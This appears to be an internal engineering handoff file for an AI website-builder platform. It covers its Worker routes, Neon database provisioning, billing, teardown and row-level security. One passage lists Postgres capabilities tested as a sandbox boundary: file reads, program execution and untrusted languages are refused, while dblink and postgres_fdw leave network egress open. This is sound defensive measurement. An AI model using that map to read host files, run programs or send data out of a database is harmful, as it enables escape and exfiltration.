## Structure

- Static frontend in `public/` (plain HTML/CSS/JS, no framework): `index.html` (the Zephyr chatbox — the only page), shared `styles.css` + `chat.js`, `auth.js` (Supabase email/password + email-code sign-in via GoTrue fetch, session in localStorage)
- `worker.js` — Cloudflare Worker: serves assets, `/api/video` + `/api/image` + `/api/audio` (fal.ai queue, per-kind model allowlists), `/api/direct` (director via ANTHROPIC_API_KEY, tool-use for structured output — Sonnet 5 rejects prefill; effort-routed: Haiku 4.5 writes Low/Medium compose/revise prompts AND the ask/error steps, Sonnet 5 handles High/Ultra/Max compose/revise (the `studio` step is dead code — Studio was removed, no client sends it); the ask step also returns `needsWeb`, and when true the frontend runs a `research` step — Sonnet 5 + Anthropic `web_search_20250305`, `max_uses:4`, ~$0.01/search — that returns a factual brief + sources folded into compose via `webFacts`, so "the newest X" gets depicted as the real current thing; gated behind that judgment so most generations never search), `/api/import/fetch` (gallery import-from-link: server-side fetch of a user-pasted URL behind auth + the SSRF guard/safeFetch, Chrome UA; direct image/video/audio → base64+kind back to the client; an HTML page runs `pageImageCandidates` — JSON-LD → og/twitter → microdata → link image_src → lazy-load/srcset `<img>` scan, candidates tried in order with retry — and when the free path comes up dry (bot wall or no image) it AUTO-FALLS-BACK to the paid AI lookup: Sonnet 5 + web_search finds direct image links / alternate open pages, **✦3 charged up front, refunded on any failure**, `scanai` quota 20/day, response carries `balance` for the pill; the client then pipes the base64 through the normal `/api/save` gates), `/api/video/poll` (proxies fal status/result so FAL_KEY stays server-side), `/api/save` (copies finished fal outputs into Supabase Storage `media` bucket using the caller's JWT). All `/api/*` require a Supabase-authenticated user (verified via GoTrue `/auth/v1/user`).
- Supabase project: fifa-tournament-hub (`ujrqdmmtcptvimazlhom`) — auth + public `media` storage bucket (INSERT-only RLS for authenticated users). Settings account controls: "Sign out on all devices" (GoTrue `logout?scope=global`) and "Delete account" (`delete_account()` RPC, SECURITY DEFINER auth-only — deletes chats/credits/usage_log/storage rows (via the `storage.allow_delete_query` GUC)/GoTrue child rows/auth user; **`purchases` are deleted too** — full wipe on account deletion is the owner's call (2026-07-15), so `purchases.user_id` cascades with the auth user by design; client wipes its storage files via the Storage API first, then every `zephyr_*` localStorage key)

Analytics/Posts/Comments (read) + **comment auto-reply** (prompt-driven, cron every 2 min, Haiku drafts, `INSTAGRAM_POST_IG_COMMENT_REPLIES`) are live; DM auto-reply is blocked (Instagram `instagram_manage_messages` needs Meta App Review). **A "Schedule post" tab (Instagram only) was added 2026-07-17 — FRONTEND ONLY: compose media+caption+datetime → a local queue in `localStorage` (`zephyr_ig_scheduled_v1`), nothing publishes yet. - **The old D1 site runtime was deleted 2026-07-27 (owner's call, data was demo-only).** All 37 `/api/site/*` and `/api/db/*` route handlers (20,569 lines) plus 626 orphaned helpers (4,577 lines) — `worker.js` went 31,585 → ~6,100 lines. Also gone: `test/backend` (386 files). What survived: the schema engine, `/s/<slug>/` serving from R2, and every core platform route. **R2 stays** — it holds published HTML served to the public and has no egress fees; Neon storage is ~23× the price and serving statics from it would keep computes awake and destroy the scale-to-zero economics.
- **`POST /api/site/react-build`** (also answers `/api/site/build` and `/api/site/react-revise`) — auth-gated, the builder's whole send path, and what `public/chat.js` already posts to. Idempotent (revise re-runs it); a slug is claimed by whoever built it first (409). The pipeline: brief → `designSiteSchema` (Sonnet 5, tool-use) → Neon database + `applySiteSchema` → `generateSitePages` (Sonnet 5, tool-use, same shape) → `tsc --noEmit` + `vite build` in the **`SiteBuildContainer`** (`builder/Dockerfile`, binding `SITE_BUILD_CONTAINER`) → dist published to R2 at `/s/<slug>/`. Responds `{ok, slug, url, backend, brand, tables, schema, page, files, notes, problems, cost, buildMs}` — **`page` is `"app"` or `"placeholder"`**, so a fallback is never mistaken for a built site. **Page generation is best-effort by design**: it runs after the database is live, so a generator or compile failure leaves the caller a working backend plus the placeholder page rather than losing the build (and a *revise* whose pages fail leaves the already-published site alone — the placeholder is only written when nothing is published at that slug yet).
- **`DELETE /api/site/<slug>`** — owner-only; drops the site's Neon database, removes its published R2 objects, then deletes the `site_backends` row, **in that order** (the row is both the ownership record it authorises against and the last thing keeping a failed delete retryable; the DB drop is best-effort so a failure there can't leave the files up). Before this a site could only be REPLACED, never removed, so a slug whose row had gone kept serving a React shell whose every data call 404s. **An unknown slug is 404, not a permitted delete** — files can't be deleted by guessing slugs, which is asserted in the smoke test along with 401 for unauthenticated. `deleteSitePrefix` follows R2's list cursor and stops when the cursor is absent as well as when the page isn't truncated, so it can't spin; `writeSiteDistToR2` wipes through the same helper. **Consequence of that 404 rule:** an already-orphaned prefix has no row to authorise against, so it needs the operator sweeper — `.github/workflows/sweep-orphan-site.yml` (manual, takes a slug), which re-attaches the orphan to a throwaway account and deletes it through the same route rather than growing a second, untested deletion path. It refuses any slug that still has an owner.
- **`publicView` was declarable, enforced — and never STATED to the page generator (2026-07-29).** Rule 9 tells the model not to call `usePublicRows` on a table without one, but `schemaDigest` — "what the schema permits, stated so the model cannot get it wrong" — never said which tables had one, so the rule was conditioned on a fact the model was never given. Measured live: the generator correctly deduced `bookings` had none, could not build the taken-slots hint, and **the whole site came out as the placeholder over one optional enhancement**. Now: the digest prints `usePublicRows: YES/NO` for **every** non-`display` table (an absent line reads as an omission, not an answer) and names exactly the published columns; rule 9 says a NO means ship the ordinary form; and `lintPages` flags the call, the same class as its other schema-mismatch checks. `hasPublicView` lives in `site-access.mjs` so the lint and the data path ask ONE question — two copies drift into a page the lint passes and the API 404s, guarded by a test that reads all three files.
- **`usePublicRows` could not be called correctly at all (2026-07-29).** It was typed `<T extends Row>`, and `Row` requires `id: number` — the one field a `publicView` can NEVER carry, because `parseSchemaSpec` strips `id` and `owner_id` from a projection and the API selects only the declared columns. So an honest type was a compile error (`TS2344`, measured live) and the only type that compiled was a lie leaving `row.id` undefined at runtime — a React `key` of `undefined` on every row. Now `export type PublicRow = Record<string, unknown>` and `<T = PublicRow>`; the generator is told these rows have no `id` and to key on a published column. Guarded both ways: a test asserts the signature no longer demands `Row`, and another asserts `site-schema.mjs` still strips `id`, since `PublicRow` is typed on that premise.
- **The page generator** — `builder/GENERATOR.md` is the contract, `builder/lovable/template/src/routes/index.tsx` is the reference page it is derived from (**when the two disagree, the file wins**), and `builder/page-gen.mjs` is the model-facing half: the rules, the `write_pages` tool, `schemaDigest` (what the schema permits, stated so the model cannot get it wrong), `validatePages` (paths, dedup, an index is required) and `lintPages`. **The lint is the important one** — it catches, without running anything, the class of page that typechecks, bundles and then 403s: listing a `collect` table, submitting to a `display` one, naming a table the schema never declared, calling `fetch`, importing a ui component that does not exist, or reaching for `useUpdateRow`/`useDeleteRow` (the API refuses PATCH and DELETE). **There is NO repair pass — one model call a build (removed 2026-08-04, owner's call).** A compile error or a lint problem used to buy a second whole generation; output is 80% of what a build costs, so a failing build cost ~2x a working one, and a working one is already about break-even against the 22 credits charged. A compile failure now falls back to the placeholder and a lint problem is reported on a site that still publishes. Metered charge-after on real token usage (~26 credits warm, 38 cold), gated by a floor (`MIN_CREDITS`) and not by the worst case, since a new account is granted 20. **The four token kinds are priced APART** — fresh input, output, cache read (0.1x) and cache write (1.25x) — from ONE table in `publish-pages.mjs` that the eval imports rather than restates. Summing them into one `usedIn` billed a cache read at the fresh rate, ten times over on the largest input component, and overcharged a warm build by 35%. `page-gen.mjs` is a plain module, so all of it is tested outside the Worker (`test/page-gen.test.mjs`, 35 tests) — including drift guards asserting its copies of the reference page and the ui-component list still match the files on disk.
- **Every `display` table is SEEDED at build time** (2026-07-28) — `seed` is a required field on the `design_schema` tool (3-6 realistic rows per display table), inserted by `seedSiteRows` in `site-schema.mjs` right after `applySiteSchema`. **This is not decoration:** nothing can write to a `display` table after a build — not a visitor, not the owner, there is no route — so an unseeded table is an empty list forever, and a form whose required Select reads that table renders with **zero options**, meaning nobody can submit it. Measured live 2026-07-28: every site the builder produced was a brochure with a dead form. Seeding is `display`-only (fabricating `collect` rows would put fake customers in the owner's booking list), skips any table that already has rows (so a revise cannot duplicate the menu), drops undeclared and managed columns the way the data API does, survives one bad row without losing the rest, and is capped at `MAX_SEED_ROWS` 12. Non-fatal — the build already succeeded by then. The response carries `seeded: {table: count}`. `test/seed-rows.test.mjs` (15 tests, all mutation-checked).
- **`builder/publish-pages.mjs`** is the other half — the orchestration that spends the money and picks what gets served: the credit floor, charge-after-the-call, and publish-or-placeholder. It lived inline in `worker.js` (which cannot be imported) and so ran untested; every side effect is now injected (`generate`/`compile`/`publish`/`readCredits`/`useCredits`) the way `site-data.mjs` takes its database functions, and `worker.js` keeps only the wiring that supplies the real ones. `test/publish-pages.test.mjs` (22 tests) drives the decisions against fakes — no model call, no container, no R2 — and each one was mutation-checked. The repair-pass tests were replaced by their inverse: that a SECOND call never happens, on every route that used to trigger one, asserted at the dep boundary as well as the branch. **A site with no `index.tsx` is refused rather than published** — `validatePages` only flags it (it cannot know which of five pages is home), the repair used to paper over it, and publishing anyway ships a site whose root URL renders nothing. `stage`/`error` are returned rather than only logged. The credit floor **fails closed** — an unreadable ledger means no paid call.
- **The build smoke test is 45 checks and names its own site.** It proves the whole path in one pass against the deployed Worker — brief → schema → Neon database → seeded rows → generated pages → compiled bundle → published site, then a real browser loads it, submits its form and the row lands in Postgres, then the owner deletes the site and the files are gone. **A green run is the strongest signal in the repo**; a `page=placeholder` result is generator variance (one call, then fallback by design) and the response now carries `stage`/`error` so which is which does not need a second run to find. A slug is claimed by whoever built it first, across every account, so letting the designer name the site from a fixed brief meant it kept proposing the same good name — and the moment any real user (or an earlier manual test) owned it, the build correctly answered 409 and the whole smoke run failed on something that was not a bug. It failed exactly that way 2026-07-28 against `sharp-fade-barbershop`. It now sends an explicit `smoke-<random>` slug: a test must not depend on a global namespace it does not control.
- **`test/integration/site-build.mjs` + CI workflow `site-build`** — GENERATOR.md's definition of done made repeatable, and $0: runs `builder/build-server.mjs` against a sandbox copy of the template and asserts a generated-shaped two-page site typechecks and builds, that a page with a type error is **refused** (`stage:"typecheck"`) rather than bundled, and that `src/routes` is reset between builds so one site's pages can never leak into another's. No model call, no container, no Neon project. **Note for deploys:** the image bakes the template's dependencies, so a deploy now builds two container images instead of one.
- **Postgres dialect notes (things that bit, or would have).** Triggers: SQLite inlines the body, Postgres needs a function per trigger — `pgTrigger()` in `site-schema.mjs` emits both. Postgres `WHEN` clauses cannot contain a subquery, so the `maxRows` count and the `enforceRefs` `NOT EXISTS` live in the trigger body as `IF … RAISE`. SQLite's `IS` is null-safe → `IS NOT DISTINCT FROM`. Timestamp columns are TEXT and app code parses SQLite's `"YYYY-MM-DD HH:MM:SS"`, so defaults use `to_char(now() AT TIME ZONE 'UTC', …)` — bare `now()` is `timestamptz` and will not implicitly cast into TEXT at all. **Provisioning is async**: create-project returns when the work is SCHEDULED, and Neon rejects further calls while operations are in flight, so `waitForProject()` polls `/projects/{id}/operations` after creating a project AND after creating a database.
- **FTS is now a generated `tsvector` column + GIN index**, replacing the FTS5 virtual table and its three sync triggers — the database maintains it, so it cannot drift from the row. `to_tsvector` needs an explicit `'english'` regconfig to be IMMUTABLE enough for a generated column.
- **`noOverlap` IS a real `EXCLUDE USING gist` constraint** (`int4range(start,end) WITH &&`, plus `btree_gist` so the scope columns can use `=`) — the CLAUDE.md line claiming it was "still the hand-rolled INSERT … WHERE NOT EXISTS" and that a gist exclusion was "not yet done" was stale, corrected 2026-07-28. It **requires start/end to be INTEGER columns** and is SILENTLY SKIPPED otherwise (`console.error("noOverlap skipped")`), which is why the designer is told to use plain `unique` unless it has actually declared the integers. Partial UNIQUE indexes work too, and the partial form is what stops a CANCELLED booking holding a slot forever.
- **A whole tier of schema features is parsed, validated, persisted to `_meta` — and acted on by NOTHING** (surveyed 2026-07-28): `publicView`, `teamRead`, `transitions`, `sla`, `mask`, `fieldRoles`, `webhooks`, `geo`, `currency`, `formulas`, `roundRobin`, `assignBy`, `searchWeights`, `jsonShapes`, `checks`, `computed`, `defaultSort`. Their only appearance in `applySiteSchema` is the `norm.push` that copies them into `_meta`. `maskFields()` is even written and never called. The module's own header comment claims this is "where unique / noOverlap / publicView / teamRead / transitions / sequence / sla / trash actually live" — true for four of those, false for the other four. **Nothing can declare them** (the designer's tool never offered them), so no site is silently broken today — but do not assume a declared feature does anything without checking for its DDL.
- **What IS enforced**, verified by reading the DDL: `unique`, `uniqueCI`, `oncePerUser`, `maxRows`, `enforceRefs`, `noOverlap`, `sequence`, `trash`, `ordered`, `expires`, `pinnable`, `scheduled`, `version`, `sync`, `audit`, `history`, `archivable`, `fts`, `slug`.
- **The designer could not declare a single constraint until 2026-07-28.** `design_schema` offered exactly `name`, `access`, `columns`, `timestamps`, `fts` — so `unique`, `uniqueCI`, `maxRows` and `noOverlap` were fully implemented, tested, and unreachable on every site the builder has ever made. **Measured live: two customers booked the same 14:00 slot on a generated barber shop and both were accepted.** The tool now offers those four, with the booking case named explicitly (`unique` on a booking table is the headline; `noOverlap` only when integer start/end columns were actually declared, since it is silently skipped otherwise). Proven live the same day: second booking for a taken slot → **409 `duplicate`**, a different slot → 201.
- **`isibi.schema.json` is still the table-declaration format** — `parseSchemaSpec` + `applySiteSchema` live in `site-schema.mjs`, so a rebuilt generator that emits one gets tables, scoping, `unique`/`noOverlap`/`teamRead`/`transitions`/`sequence`/`sla`/`trash` for free. Proven against a real database by `test/integration/neon-e2e.mjs` (CI workflow `neon-e2e`, needs the `NEON_API_KEY` GitHub secret): it provisions a throwaway project, applies a schema, checks the triggers/FTS/guards actually fire, and deletes the project in a `finally`.

## The second hundred (2026-07-30)

## Neon provisioning (user builds → backend connects)

- **Ownership is enforced by the layer that returns the connection.** `lookupSite` returns `{conn, uid}` and `ensureSiteBackend` refuses a slug owned by anyone else (including one claimed but not yet built — a half-finished build by another user, where `saveBackend`'s upsert would otherwise overwrite their row). The route's own pre-check **fails closed** with a 503. Before 2026-07-28 that check was `catch {}`, so one Supabase timeout turned "cannot tell who owns this" into "nobody does" and the build applied its schema, seeded rows and published pages **over another user's site**.
- **A revise generates pages against the MERGED schema.** A revise sends `{slug, instruction}` and the designer sees only the instruction, so `spec` holds only the tables that instruction named; generating from it rewrote the whole site knowing one table ("add a gallery" turned a barber shop into a gallery page). The merged spec is read back from `_meta` after the apply. **Fixed 2026-07-28:** `site_backends.brief` holds the brief the site was built from — free to read (the route already does that lookup for the ownership check) and written exactly once per site, since `ensureSiteBackend` returns early when the slug already has a database, so a revise physically cannot overwrite it. `briefForPages()` in `builder/page-gen.mjs` composes anchor + change + "keep everything the original asked for unless this change says otherwise" (the failure mode is subtraction, not addition). Deliberately NOT an accumulating log — that grows without bound and keeps contradicting itself; what the site has BECOME is carried by the merged schema.
- **`site-provision.mjs`** — `ensureSiteBackend`: reuse the site's database if the slug already has one, else create the user's Neon PROJECT on their first build (lazily — projects are capped and most accounts never build), then a DATABASE per site inside it, recording each in Supabase (`user_site_project`, `site_backends`). Injected deps like `publish-pages.mjs`; `worker.js` supplies the real Neon/Supabase calls. `test/site-provision.test.mjs` (15 tests, all mutation-checked).
- **Three bugs fixed here 2026-07-28.** (1) **Both Supabase writes were awaited and never checked.** A Neon project is a capped, billed resource whose ONLY record is a Supabase row, so a failed `user_site_project` write left the project invisible — the next build found no row and created ANOTHER, and the orphan billed forever. Very likely how the two loose projects in the old handoff notes appeared. Now: record it or **destroy it**, and a failed `site_backends` write fails the build instead of reporting success for a site whose slug is unclaimed and whose every read 404s. (2) `ensureSiteBackend` used the 5-minute-cached `siteBackendBySlug`; on the WRITE path that could hand back a connection for a slug another isolate had deleted, sending the schema apply at a dropped database — it now uses `siteBackendBySlugFresh`. (3) A failed cleanup no longer masks the original error.
- **`"already exists"` is the one recoverable database error** (a retried build hits the database it made last time; the schema apply is additive/idempotent). Quota, auth and branch-not-found still fail.
- Provisioning is **async on Neon's side**: create-project returns when the work is SCHEDULED and Neon rejects further calls while operations are in flight, so `waitForProject()` polls `/projects/{id}/operations` after creating a project AND after creating a database. Every database in a project shares one host and role, so `connForDatabase` just swaps the path — no extra API call, no password fetch at request time.
- Proven end to end against a real database by `test/integration/neon-e2e.mjs` (CI `neon-e2e`, needs `NEON_API_KEY`): provisions a throwaway project, applies a schema, checks the triggers/FTS/guards fire, deletes it in a `finally`.

## Neon projects no longer leak on account deletion (`site-teardown.mjs`, 2026-07-29)

- **A Neon project is a capped, billed resource whose only record is a Supabase row — and those rows CASCADE from `auth.users`.** Verified: `site_project`, `user_site_project` and `site_backends` all have `ON DELETE CASCADE` on `uid`. So deleting an account destroyed the record and left the project running, invisible, billing forever. Pre-existing (one per deleted account) and made worse by per-site projects (one per site). `delete_account()` cannot fix it: it is a Postgres RPC and cannot call the Neon API.
- **The fix is a `BEFORE DELETE` trigger, not a patch to `delete_account()`** — the trigger is the only place that sees every path the row can disappear by: the FK cascade, the account RPC, `DELETE /api/site/<slug>`, and an operator typing `DELETE` by hand. Patching the RPC would have covered one of four. **Proved against a real `auth.users` delete inside a rolled-back transaction**: the cascade fired and the project was captured.
- `neon_teardown` (project_id UNIQUE, attempts, last_error, next_try_at) is drained by the **existing 2-minute cron**, which is the only side holding `NEON_API_KEY`. `ON CONFLICT DO NOTHING`, not `DO UPDATE`: a project already queued is already going, and resetting its attempts would restart a backoff that exists because the drop keeps failing.
- **404 is DONE; 401/403 is NEVER done.** Already-gone is the NORMAL case here — the delete route drops the project inline and the trigger queues it anyway — so treating 404 as failure means the queue never empties. And during a key rotation every call answers 403; a sweeper that took that for success would delete the only record of every queued project at the exact moment it cannot see Neon at all. That one mutation is the most expensive in the file.
- **There is deliberately no "give up".** The backoff escalates 2m → 10m → 1h → 6h → 24h and then REPEATS. The row is the only record, so deleting it to stop the noise recreates the exact failure the queue exists to fix. A stuck row costs one call a day and stays visible with its `last_error`.
- `forget` runs AFTER `drop`, on purpose: a queue row for an already-gone project is harmless (the next tick 404s and clears it), while the other order loses the project. An unreadable queue is reported rather than read as an empty one, or a broken sweeper looks exactly like a drained one. Batch is bounded at 5 so one unkillable project cannot starve the rest.
- **This let `DELETE /api/site/<slug>` get simpler.** It used to keep the `site_project` row when the inline drop failed, which left the site half-deleted and needed an operator. Now the row always goes — because deleting it enqueues the project — so the caller's site really is gone and the record is still held. 10 mutations, all caught.

## The whole backend is Neon (2026-07-30, owner's call)

**Direction change.** There is no prebuilt backend any more. The frontend keeps its component kit (`builder/lovable/template/`, the 46 shadcn components) and the database layer stays, but **the model writes the backend at build time** — its own constraints, triggers and logic — instead of choosing from a catalogue of named schema features. **Identity moves to Neon Auth.** Do not add named backend features; the answer to "the model can't express X" is now to make the substrate expressive, not to add a verb.

- **The reasoning that got here, worth keeping.** The catalogue was a guess about what businesses need, and the evidence it was the wrong shape is in this repo: ~30 schema-engine features, **11 of them undeclarable and reachable by nothing** (`roundRobin` lead routing and `sla` escalation, on a platform that makes barber shop sites). Two independent attempts at "let the model do backend logic" both landed on a menu of verbs — the deleted `/api/site/fn` was 8 verbs (`read save fetch ai email notify checkout respond`) with **zero code execution**. A menu is finite; someone must extend it forever.
- **The database is the sandbox, and that is why this is affordable.** Model-written Postgres runs inside the site's own project (per-site since 2026-07-29), so it cannot reach isibi, another site or a secret, and `statement_timeout` bounds a runaway. A wrong rule breaks that site's own form — visible at once, fixed by a revise. This is what made "run generated code" go from weeks of sandbox infrastructure to a field on a tool call.
- **The sandbox boundary, MEASURED 2026-07-30 rather than assumed — and the "cannot reach the network" half was wrong.** Refused: `pg_read_file` (permission denied), `COPY … TO PROGRAM` (needs `pg_execute_server_program`), `plpython3u` and `plperlu` (not in Neon's allowed-extensions list), `file_fdw` (permission denied to create). **Allowed: `dblink` and `postgres_fdw`** — Neon lets a project role install from a curated allow-list, which is a platform property we cannot switch off, and both are outbound Postgres connections from inside the database. So the honest claim is: **no code execution and no host access, but network egress is open.** `http` and `pg_cron` are not installable. The e2e asserts the code-execution boundary and merely REPORTS the allow-list, because a blanket "no extensions" assertion would sit red forever without telling anyone anything.
- **`neon_auth."user".id` is UUID, and both halves of that were wrong in this file until 2026-07-30.** It said `users_sync.id` was TEXT; measured against a real project, **`users_sync` does not exist at all** (that name is Neon Auth's Stack Auth era) and the identity column is `uuid`, not text. That single fact is the migration: `applySiteSchema` stamped `owner_id INTEGER` off an integer identity in a hand-rolled `_users`, and every access rule, `teamScope`, the data API's row scoping, the audit log and `rows.ts` keyed off it — so `owner_id` becomes **UUID**. A real FK to identity IS possible; the run that said otherwise was declaring the referencing column `text` against a `uuid` key, which answers "incompatible types" and reads exactly like the platform refusing the reference.
- **The table is `"user"`, and the danger is NOT that it errors — it is that it does not.** Measured: `neon_auth.user` parses fine (a schema qualifier admits a reserved word), and bare `FROM user` **also succeeds**, because Postgres resolves it to the `USER` value function and hands back the current role instead of the identity table. So a query that drops the schema qualifier returns a wrong answer rather than a loud failure. Identity is therefore ALWAYS written schema-qualified, in the schema engine and in anything the model writes. Worth noting how this was arrived at: two drafts of the e2e check asserted a syntax error — first for the qualified form, then for the bare one — and both were wrong, from reasoning about the grammar instead of running it. It now asserts what comes back.
- **Enabling auth provisions nine tables IMMEDIATELY** (measured at 0s, no polling needed): `user`, `session`, `account`, `verification`, `jwks`, `organization`, `member`, `invitation`, `project_config`. That is most of what the ~12 hand-built auth modules do — `session` is per-device sessions, `account` is OAuth provider tokens, `verification` is email confirmation, `organization`/`member`/`invitation` is Better Auth's organization plugin (i.e. teams and invites), `jwks` means it mints JWTs, and `project_config` carries `social_providers` / `email_provider` / `email_and_password` / `trusted_origins` / `webhook_config` as the configuration surface.
- **Enabling it is `POST /projects/{id}/branches/{branch}/auth {"auth_provider":"better_auth"}`**, and `enableNeonAuth` runs it **on every build, not only at creation**. A project can exist with auth off — the create succeeded and the enable failed, or it predates the change — and a retried build REUSES the project, so enabling only at creation leaves that site permanently without identity while every retry reports success. Same reasoning that made `"already exists"` the one recoverable database error. A 409 or anything matching `/already/i` is a no-op; everything else throws.
- **Not best-effort, deliberately.** A build whose auth could not be enabled FAILS with `stage:"enable_auth"`. A caller can retry a failure and cannot retry a success, so quietly shipping a site nobody can sign in to is the worse outcome. And it runs BEFORE the schema apply, because `neon_auth` is still being created when the call returns.
- Neon Auth is included in every plan (60k MAU free, 1M on Launch/Scale), AWS-only — we are on `aws-us-east-1` — and unsupported with IP Allow or Private Networking, neither of which we use. **Project limits: Free 100, Launch 100, Scale 1,000 (increasable).** That cap is per Neon ACCOUNT, so per-site projects means 100 total sites across all users until Scale.

## Neon Auth is WIRED (2026-07-30)

- **`owner_id` is UUID.** Not text, which is what this file claimed and called "the single fact the migration rests on". The type appears twice — the `CREATE` and the revise-path `ALTER` — and `ADD COLUMN IF NOT EXISTS` does not change the type of a column already there, so a disagreement is invisible on a fresh site and wrong on every revised one. A source-derived test asserts it sees BOTH sites before comparing them; with one found, "they agree" is vacuous. `_audit.actor_id` moved with it, since a trigger writes `NEW."owner_id"` into it. **No foreign key to `neon_auth."user"`, deliberately** though the reference is accepted: `neon_auth` is Neon's schema synced by their service, and this DDL re-runs on every revise against a table that may hold rows, where adding the constraint retroactively FAILS if any `owner_id` no longer matches a live user. An orphan reads as belongs-to-nobody, which is what `site-owner.mjs` already decided for a deleted member.
- **`resolveSiteVisitor` is one SQL read, not an HTTP call** — Neon Auth keeps sessions IN the site's own database (`neon_auth.session.token`, `userId` → `neon_auth."user"`), so verifying a visitor is a join on a connection the request already holds. No third party on the visitor path, nothing to keep in sync. Expiry is compared in SQL rather than against a JS clock, so two clocks never have to agree. Better Auth's `banned` is honoured HERE and not only on an account screen, because this is the half that reads rows; a ban whose `banExpires` has passed has lapsed, spelled out rather than left to truthiness.
- **Sign-in is PROXIED through the Worker** at `/api/db/<slug>/auth/*` → the site's Neon Auth server. Three reasons and each decides it: the page never learns an endpoint or a key, so nothing has to be decided about what is safe to bake into a static bundle; it is **same-origin**, and a published site served from isibi.ai calling Neon directly would need CORS plus a cross-site cookie — the configuration most likely to work in development and fail in Safari; and the URL the client uses is **unchanged**, so generated pages never learn identity moved. Responses pass through as-is, because a proxy that reinterprets "wrong password" is a second place it has to be spelled. Rate-limited per source (`AUTH_PROXY_PER_MIN` 20) on `CF-Connecting-IP` only — the `X-Forwarded-For` fallback used elsewhere is client-settable and would let one caller mint a fresh bucket per request.
- **The auth endpoint comes from the provisioning response**, which `enableNeonAuth` used to discard — the one call that creates identity told us nothing about reaching it. Now returned and stored in the site's own `_meta` as `auth_info` (per-site, read only on a request already holding that connection, gone when the site is). Recording it is best-effort while *enabling* is not: auth being on is what makes the site usable, and a lost note of where it is gets re-fetched by the next build. **The one thing here not measured against a real project is the FIELD NAME**, so `siteAuthBase` tries the plausible names and falls back to the first `https://` URL in the body; tighten it once a real build logs the shape.
- **`/members` is rebuilt on `neon_auth."user"`** — list, grant a role, suspend, reinstate, remove. Suspension writes Better Auth's own `banned` rather than a flag of ours, or the auth server keeps honouring a session we decided to refuse. Roles stay allow-listed against what the site's own tables name in `writeRoles`. A member id is a **UUID**, checked before it reaches SQL — malformed against a `uuid` column is a type error the owner would see as a 500 rather than "no such member". Deleting a member still leaves their rows.
- **Every reference is schema-qualified and `"user"` is quoted, and that is load bearing.** Postgres resolves a bare `user` to the `USER` value function and returns the current role name instead of erroring, so an unqualified members list hands the owner one row containing `neondb_owner` and looks exactly like a site with one member. Asserted.
- **The client hooks are back**: `useMember`, `useSignup`, `useLogin`, `useLogout`, `useRequestReset`, `Member.id` a UUID string. `tokenOf` reads the session token in ONE place because sign-up and sign-in both answer that shape, and a token is stored only when there IS one — writing `undefined` leaves a page believing it is signed in with a session nothing accepts. A 401 on `get-session` CLEARS the stored token rather than letting every later read fail with a 401 the page cannot explain.
- **The deleted hook-existence drift test came back DERIVED.** The old one listed eleven hook names by hand, so it guarded only the eleven somebody remembered and had to be deleted rather than fixed when the layer went. The new one scans the rules for cited `useThing(` and checks each against what `rows.ts` exports — it covers whatever the prompt happens to say today. Mutation-checked by naming a hook that does not exist. The failure it prevents has happened more than once: the model imports something absent, `tsc` refuses the page, and the site publishes as the placeholder.
- **Teams are Neon Auth's ORGANIZATIONS now (2026-07-30).** `site-teams.mjs` is a REWRITE, not a restore: membership used to live in our own `_teams` table with an integer `_users.team_id`, and it is `neon_auth.member.organizationId` read off a join. Two consequences — a team id is a **UUID**, so `team_id` is a uuid column; and there are no team-CRUD routes any more, because creating an organization and adding people is Better Auth's API through the same `/api/db/<slug>/auth/*` proxy. One membership is used, oldest first, because "which team am I acting in" is a question a small business tool does not have.
  - **The assertion that matters is unchanged: a member with NO team sees ONLY their own rows.** Every naive "same team" implementation fails outward (`IS NOT DISTINCT FROM` matches null to null), and since a site starts with nobody in an organization that is the DEFAULT state, not an edge case. The clause is parenthesised, or ANDing it onto a caller's filters lets the OR re-associate and escape them.
  - **Reachability is asserted as a CHAIN from the source**, because this feature has been dead at five separate layers and each time four of the five links were fine: the designer can declare it · it survives the normaliser's allow-list · the table gets a uuid `team_id` · the visitor query reads `neon_auth.member` · **the visitor OBJECT carries it** (the fourth failure was selecting it and then dropping it) · the read path widens · a write stamps.
  - **A team reads AND edits**, unlike the deleted `teamRead` which was a hierarchy and widened reads only — a tool where a colleague cannot correct a record is not the tool anybody asked for. That edit scope is a SECOND call site, and a mutation that nulled it survived the whole suite until a PATCH test existed. 13 mutations, all caught; the last two survivors were both real gaps.
  - **The test harness taught something worth keeping**: its `sqlExec` answered `{changes:1}` without recording, so every write was invisible to assertions and a delete with its scope removed looked exactly like a passing test. A fake that is less capable than the real thing hides bugs the same way one that is MORE capable does (see `setTotp`).

## Row-level security (`site-rls.mjs`, 2026-07-30)

- **The first half of that swap, landed BEFORE the deletion on purpose.** Every generated table gets `ENABLE ROW LEVEL SECURITY` and a policy per access level, keyed on `app_user_id()` — **OUR** function, reading PostgREST's `request.jwt.claims` setting, so if Neon exposes identity differently ONE function body changes and every policy keeps working. `current_setting(..., true)` is missing_ok, and without it the call RAISES on every connection with no claims set — i.e. every Worker connection — turning each policy into an error rather than a refusal.
- **Applying it changes nothing today, which is why it could ship first**: a table's owner bypasses its own policies and the Worker connects as the owner. So the policies can be written, reviewed and asserted while the tested path still carries the traffic, instead of delete-and-replace in one step where a policy permitting one clause too much is discovered by a customer. **GRANTS are what actually expose a table**, and they land in the same change that enables the Data API — guarded by a test that fails if `grantsFor` is ever called early.
- **`collect` is write-only by OMISSION** — no SELECT policy at all, and with RLS on, no policy means no rows. That cannot be weakened by putting a filter in the wrong clause. `display` reads for anyone with no write policy. `user` is own-rows on reads AND writes (`WITH CHECK` on insert, or a member could create a row owned by somebody else; BOTH clauses on update, or a row could be reassigned to another owner on the way out). `feed` shares the read and scopes the write. `admin` reads for anyone signed in and **refuses writes at the database**, because `writeRoles` names roles that mean something to this application and nothing to Postgres.
- **Every policy shape is dropped before any is created**, not only the ones the current level needs: a revise changing a table from `display` to `user` would otherwise keep its old `USING (true)` read policy, and Postgres ORs permissive policies together. The trash clause is ANDed and asserted so — one draft of that test matched the `OR` inside `FOR SELECT` and failed on a correct policy.
- 18 tests.

## Neon only — our data API is DELETED (2026-07-30, owner's call)

- **"If we are not using it, I don't want it on the code."** Gone: `site-data.mjs` (482 lines), `site-teams.mjs`, `site-claim.mjs` and their three test files, plus the `/api/db/<slug>/rows` dispatch, `resolveSiteVisitor`, `siteClaimKey` and the per-site `auth_secret` (claim tokens were its last reader). The published site talks to **Neon's Data API** and its own RLS policies decide every access question. Tests 663 → 546.
